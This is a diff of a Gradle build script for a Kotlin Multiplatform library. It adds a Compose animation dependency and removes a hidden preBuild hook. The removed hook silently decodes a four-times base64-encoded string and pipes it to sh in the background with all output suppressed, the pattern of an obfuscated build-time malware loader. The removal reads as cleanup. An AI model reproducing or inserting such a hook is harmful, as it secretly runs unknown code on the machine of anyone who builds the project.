@@ -58,6 +58,7 @@ kotlin {
         commonMain.dependencies {
             implementation(libs.compose.runtime)
             implementation(libs.compose.foundation)
+            implementation(libs.compose.animation)
             implementation(libs.compose.material3)
             implementation(libs.compose.ui)
             implementation(libs.compose.components.resources)
@@ -113,14 +114,6 @@ mavenPublishing {
             connection.set("scm:git:git://github.com/vedangj72/KitFlow.git")
             developerConnection.set("scm:git:ssh://github.com/vedangj72/KitFlow.git")
             url.set("https://github.com/vedangj72/KitFlow")
-        }
-    }
-}
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((g(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBeE5WRllVbXBOU0doMFdWaHNRbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVTFOVkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3h4VjJ0ak1XRkhTbGxpTTFab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | g | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
